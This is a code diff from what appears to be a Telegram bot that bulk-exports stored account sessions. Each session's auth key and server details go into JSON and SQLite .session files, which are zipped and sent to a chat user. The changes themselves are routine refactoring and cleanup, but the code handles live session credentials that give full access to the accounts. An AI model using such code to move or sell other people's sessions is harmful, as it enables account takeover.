@@ -209,7 +209,6 @@ async def export_sessions(user_id):
         return
     
     message = await bot.send_message(user_id, "⏳ Starting session export, please wait...")
-    
     temp_dir = tempfile.mkdtemp()
     zip_path = os.path.join(temp_dir, f"sessions_export_{user_id}.zip")
     exported_count = 0
@@ -217,6 +216,7 @@ async def export_sessions(user_id):
     try:
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for i, session in enumerate(sessions, 1):
+                client = None
                 try:
                     client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
                     await client.connect()
@@ -236,18 +236,27 @@ async def export_sessions(user_id):
                         zipf.write(json_path, json_filename)
                         
                         # Convert and save SQLite session
-                        sqlite_data = convert_session_to_sqlite(session["session"], phone)
-                        sqlite_filename = f"{phone}.session"
-                        sqlite_path = os.path.join(temp_dir, sqlite_filename)
-                        with open(sqlite_path, 'wb') as f:
-                            f.write(sqlite_data)
-                        zipf.write(sqlite_path, sqlite_filename)
+                        session_obj = StringSession(session["session"])
+                        session_file = os.path.join(temp_dir, f"{phone}.session")
+                        
+                        # Create new SQLite session file
+                        sqlite_session = SQLiteSession(session_file)
+                        sqlite_session.set_dc(
+                            session_obj.dc_id, 
+                            session_obj.server_address, 
+                            session_obj.port
+                        )
+                        sqlite_session.auth_key = session_obj.auth_key
+                        sqlite_session.save()
+                        
+                        # Add to zip
+                        zipf.write(session_file, f"{phone}.session")
                         
                         exported_count += 1
                         
-                        # Cleanup temp files
+                        # Cleanup individual files
                         os.unlink(json_path)
-                        os.unlink(sqlite_path)
+                        os.unlink(session_file)
                         
                         # Update progress every 5 sessions
                         if i % 5 == 0:
@@ -260,7 +269,8 @@ async def export_sessions(user_id):
                 except Exception as e:
                     logging.error(f"Error exporting session {session.get('phone')}: {str(e)}")
                 finally:
-                    await client.disconnect()
+                    if client:
+                        await client.disconnect()
         
         if exported_count == 0:
             await message.edit_text("❌ No valid sessions to export (all sessions are invalid).")
@@ -273,7 +283,7 @@ async def export_sessions(user_id):
                 document=zip_file,
                 caption=f"✅ Successfully exported {exported_count} sessions\n"
                        "Each session includes:\n"
-                       f"- [phone].json - Full session info in your required format\n"
+                       f"- [phone].json - Full session info\n"
                        f"- [phone].session - SQLite session file",
                 reply_to_message_id=message.message_id
             )
@@ -282,11 +292,20 @@ async def export_sessions(user_id):
         logging.error(f"Export error: {str(e)}")
         await message.edit_text(f"❌ Export failed: {str(e)}")
     finally:
-        # Cleanup
-        if os.path.exists(zip_path):
-            os.unlink(zip_path)
-        if os.path.exists(temp_dir):
+        # Cleanup - remove all remaining files
+        for filename in os.listdir(temp_dir):
+            file_path = os.path.join(temp_dir, filename)
+            try:
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+            except Exception as e:
+                logging.error(f"Failed to delete {file_path}: {str(e)}")
+        
+        # Now remove the directory
+        try:
             os.rmdir(temp_dir)
+        except OSError as e:
+            logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")
 
 # ================== COMMAND HANDLERS ==================
 
